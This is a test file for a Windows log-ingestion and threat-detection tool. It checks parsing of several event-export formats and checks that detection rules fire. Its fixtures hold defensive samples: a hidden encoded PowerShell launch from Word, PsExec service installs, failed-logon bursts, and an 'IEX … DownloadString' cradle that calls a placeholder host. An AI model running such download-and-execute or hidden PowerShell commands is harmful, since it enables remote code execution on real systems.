import { describe, expect, it } from 'vitest'
import { ingestText, sniffFormat } from '@/core/ingest'
import { decodeText } from '@/core/ingest/util'
import { parseEventMessage } from '@/core/ingest/winexport'
import { runDetections } from '@/core/detect/engine'
import { loadRulePack } from '@/data/rules'

// Fixtures follow the real export formats; names and addresses are fictional.

const MSG_4688 = [
  'A new process has been created.',
  '',
  'Creator Subject:',
  '\tSecurity ID:\t\tS-1-5-21-1000',
  '\tAccount Name:\t\tsertu.rina',
  '\tAccount Domain:\t\tSATUAN',
  '\tLogon ID:\t\t0x3E7',
  '',
  'Target Subject:',
  '\tSecurity ID:\t\tS-1-0-0',
  '\tAccount Name:\t\t-',
  '',
  'Process Information:',
  '\tNew Process ID:\t\t0x1a2c',
  '\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
  '\tToken Elevation Type:\t%%1938',
  '\tCreator Process ID:\t0x2b10',
  '\tCreator Process Name:\tC:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
  '\tProcess Command Line:\tpowershell.exe -nop -w hidden -enc SQBFAFgA',
].join('\r\n')

const msg4625 = (port: number) => [
  'An account failed to log on.',
  '',
  'Subject:',
  '\tSecurity ID:\t\tS-1-0-0',
  '\tAccount Name:\t\t-',
  '',
  'Logon Type:\t\t\t3',
  '',
  'Account For Which Logon Failed:',
  '\tSecurity ID:\t\tS-1-0-0',
  '\tAccount Name:\t\tadministrator',
  '\tAccount Domain:\t\tSATUAN',
  '',
  'Failure Information:',
  '\tFailure Reason:\t\tUnknown user name or bad password.',
  '\tStatus:\t\t\t0xC000006D',
  '',
  'Network Information:',
  '\tWorkstation Name:\tWS-MIN-03',
  '\tSource Network Address:\t10.20.4.13',
  `\tSource Port:\t\t${port}`,
].join('\r\n')

/** What `Get-WinEvent -LogName Security | ConvertTo-Json` prints in Windows PowerShell 5.1. */
function getWinEvent(id: number, minute: number, message: string, record: number) {
  return {
    Id: id, Version: 2, Level: 0, RecordId: record, ProviderName: 'Microsoft-Windows-Security-Auditing', LogName: 'Security',
    MachineName: 'SRV-SATUAN-01.satuan.local', TimeCreated: `/Date(${Date.UTC(2026, 10, 2, 2, minute, 0)})/`, Message: message,
    Properties: ['System.Diagnostics.Eventing.Reader.EventProperty', 'System.Diagnostics.Eventing.Reader.EventProperty'],
    KeywordsDisplayNames: ['Audit Success'], UserId: null,
  }
}

/** UTF-16LE with BOM, as `> file.json` writes in Windows PowerShell 5.1. */
function utf16le(text: string): Uint8Array {
  const out = new Uint8Array(2 + text.length * 2)
  out[0] = 0xff
  out[1] = 0xfe
  for (let i = 0; i < text.length; i++) {
    out[2 + i * 2] = text.charCodeAt(i) & 0xff
    out[3 + i * 2] = text.charCodeAt(i) >> 8
  }
  return out
}

const pack = loadRulePack()
const ruleIds = (text: string, name = 'x.json') => new Set(runDetections(ingestText(text, name, 'imp').events, pack).map((d) => d.ruleId))

describe('Windows event exports', () => {
  it('reads PowerShell Get-WinEvent JSON (array, UTF-16, fields only in the message)', () => {
    const events = [getWinEvent(4688, 13, MSG_4688, 100), ...Array.from({ length: 6 }, (_, i) => getWinEvent(4625, 20 + i, msg4625(50000 + i), 200 + i))]
    const text = decodeText(utf16le(JSON.stringify(events, null, 4)))
    expect(sniffFormat(text)).toBe('winevent-jsonl')
    const result = ingestText(text, 'security.json', 'imp')
    expect(result.errorCount).toBe(0)
    expect(result.events).toHaveLength(7)
    const proc = result.events[0]
    expect(proc.host).toBe('SRV-SATUAN-01')
    expect(proc.ts).toBe(Date.UTC(2026, 10, 2, 2, 13, 0))
    expect(proc.logsource).toEqual({ product: 'windows', service: 'security', category: 'process_creation' })
    expect(proc.process).toMatchObject({ name: 'powershell.exe', parent: 'WINWORD.EXE' })
    expect(result.events[1]).toMatchObject({ srcIp: '10.20.4.13', user: 'administrator' })
    const fired = ruleIds(text)
    expect(fired).toContain('sigap-win-ps-encoded')
    expect(fired).toContain('sigap-win-office-spawn-shell')
    expect(fired).toContain('sigap-native-failed-logon-burst')
  })

  it('reads a single event exported as one JSON object', () => {
    const result = ingestText(JSON.stringify(getWinEvent(4688, 13, MSG_4688, 1), null, 2), 'one.json', 'imp')
    expect(result.events).toHaveLength(1)
    expect(result.events[0].fields.CommandLine).toContain('-enc')
  })

  it('reads Get-EventLog JSON, inferring the channel from the source', () => {
    const record = {
      EventID: 7045, InstanceId: 7045, Index: 9, Source: 'Service Control Manager', MachineName: 'SRV-SATUAN-01', TimeGenerated: `/Date(${Date.UTC(2026, 10, 2, 2, 24)})/`,
      Message: 'A service was installed in the system.\r\n\r\nService Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem',
      ReplacementStrings: ['PSEXESVC', '%SystemRoot%\\PSEXESVC.exe'],
    }
    expect(ruleIds(JSON.stringify([record]))).toContain('sigap-win-psexec-service')
  })

  it('reads Winlogbeat (ECS) lines', () => {
    const line = JSON.stringify({
      '@timestamp': '2026-11-02T02:13:02.554Z', host: { name: 'ws-min-03' }, message: 'Process Create',
      winlog: { event_id: '1', channel: 'Microsoft-Windows-Sysmon/Operational', provider_name: 'Microsoft-Windows-Sysmon', computer_name: 'WS-MIN-03.satuan.local', record_id: 77,
        event_data: { Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', ParentImage: 'C:\\Office16\\WINWORD.EXE', CommandLine: 'powershell.exe -enc AAA', User: 'SATUAN\\sertu.rina' } },
    })
    const result = ingestText(`${line}\n${line}`, 'winlogbeat.ndjson', 'imp')
    expect(result.events[0]).toMatchObject({ host: 'WS-MIN-03', user: 'sertu.rina', logsource: { category: 'process_creation' } })
    expect(ruleIds(line)).toContain('sigap-win-ps-encoded')
  })

  it('reads evtx_dump JSON lines', () => {
    const line = JSON.stringify({ Event: {
      '#attributes': { xmlns: 'http://schemas.microsoft.com/win/2004/08/events/event' },
      System: { Provider: { '#attributes': { Name: 'Service Control Manager' } }, EventID: { '#attributes': { Qualifiers: 16384 }, '#text': 7045 }, TimeCreated: { '#attributes': { SystemTime: '2026-11-02T02:24:55.000000Z' } }, EventRecordID: 31, Channel: 'System', Computer: 'SRV-SATUAN-01' },
      EventData: { ServiceName: 'PSEXESVC', ImagePath: '%SystemRoot%\\PSEXESVC.exe', ServiceType: 'user mode service', StartType: 'demand start', AccountName: 'LocalSystem' },
    } })
    const result = ingestText(line, 'system.jsonl', 'imp')
    expect(result.events[0]).toMatchObject({ host: 'SRV-SATUAN-01', ts: Date.UTC(2026, 10, 2, 2, 24, 55) })
    expect(ruleIds(line)).toContain('sigap-win-psexec-service')
  })

  it('reads EvtxECmd JSON lines (event data inside Payload)', () => {
    const payload = JSON.stringify({ EventData: { Data: [{ '@Name': 'SubjectUserName', '#text': 'admin.it' }, { '@Name': 'TargetUserName', '#text': 'svc_backup2' }, { '@Name': 'TargetDomainName', '#text': 'SATUAN' }] } })
    const line = JSON.stringify({ EventId: 4720, Channel: 'Security', Computer: 'SRV-SATUAN-01', Provider: 'Microsoft-Windows-Security-Auditing', TimeCreated: '2026-11-02T02:27:02.0000000+00:00', EventRecordId: '55', Payload: payload, MapDescription: 'A user account was created' })
    const result = ingestText(line, 'evtxecmd.json', 'imp')
    expect(result.events[0]).toMatchObject({ user: 'svc_backup2', fields: { SubjectUserName: 'admin.it' } })
    expect(ruleIds(line)).toContain('sigap-win-account-created')
  })
})

describe('message parsing', () => {
  it('reads Sysmon messages by their own field names', () => {
    const fields = parseEventMessage(1, 'Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-02 02:13:02.554\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nCommandLine: cmd.exe /c whoami\r\nUser: SATUAN\\admin.it')
    expect(fields).toMatchObject({ Image: 'C:\\Windows\\System32\\cmd.exe', CommandLine: 'cmd.exe /c whoami', User: 'SATUAN\\admin.it' })
  })

  it('keeps the PowerShell script block whole', () => {
    const fields = parseEventMessage(4104, "Creating Scriptblock text (1 of 1):\r\nIEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\r\nWrite-Host 'a: b'\r\n\r\nScriptBlock ID: 1f2e\r\nPath: ")
    expect(fields).toEqual({ ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\nWrite-Host 'a: b'", ScriptBlockId: '1f2e' })
  })

  it('decodes UTF-8 with and without a byte-order mark', () => {
    expect(decodeText(new Uint8Array([0xef, 0xbb, 0xbf, 0x7b, 0x7d]))).toBe('{}')
    expect(decodeText(new TextEncoder().encode('Rincian Tukin — Nov'))).toBe('Rincian Tukin — Nov')
  })
})
